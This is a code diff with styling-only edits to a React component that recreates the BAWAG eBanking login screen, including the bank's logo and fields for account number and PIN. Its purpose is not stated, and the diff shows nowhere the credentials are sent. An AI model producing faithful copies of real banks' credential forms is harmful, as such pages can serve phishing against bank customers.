@@ -17,7 +17,7 @@ const Bawag = () => {
       <div className="w-[970px]">
         {/* Header */}
         <header className="bg-white border-b border-gray-200 px-4 py-2 flex items-center justify-between">
-          <img src={bawagLogo} alt="BAWAG eBanking" className="h-16" />
+          <img src={bawagLogo} alt="BAWAG eBanking" className="h-20" />
           <span className="text-xs text-gray-500">{dateStr}</span>
           <div className="flex gap-1">
             {["DE", "EN", "BKS", "TR"].map((l) => (
@@ -57,8 +57,8 @@ const Bawag = () => {
 
               <div className="p-4 flex-1 flex flex-col">
                 {/* Verfüger tab */}
-                <div className="mb-4 text-center border-b border-gray-200">
-                  <span className="text-[#990000] text-xs font-semibold border-b-2 border-[#990000] pb-1 inline-block">
+                <div className="mb-4 text-center border-b-2 border-[#990000]">
+                  <span className="text-[#990000] text-xs font-semibold pb-1 inline-block">
                     Verfüger
                   </span>
                 </div>
@@ -69,7 +69,7 @@ const Bawag = () => {
                     value={verfueger}
                     onChange={(e) => setVerfueger(e.target.value)}
                     placeholder="Verfügernummer"
-                    className="w-full border border-gray-300 rounded px-2 py-1.5 text-xs focus:outline-none focus:ring-1 focus:ring-[#990000]"
+                    className="w-full border border-gray-400 rounded px-3 py-2.5 text-sm focus:outline-none focus:ring-1 focus:ring-[#990000]"
                   />
                 </div>
 
@@ -80,14 +80,14 @@ const Bawag = () => {
                       value={pin}
                       onChange={(e) => setPin(e.target.value)}
                       placeholder="PIN (8 bis 16-stellig)"
-                      className="w-full border border-gray-300 rounded px-2 py-1.5 text-xs pr-8 focus:outline-none focus:ring-1 focus:ring-[#990000]"
+                      className="w-full border border-gray-400 rounded px-3 py-2.5 text-sm pr-10 focus:outline-none focus:ring-1 focus:ring-[#990000]"
                     />
                     <button
                       type="button"
                       onClick={() => setShowPin(!showPin)}
                       className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                     >
-                      {showPin ? <EyeOff className="h-3.5 w-3.5" /> : <Eye className="h-3.5 w-3.5" />}
+                      {showPin ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
                     </button>
                   </div>
                 </div>
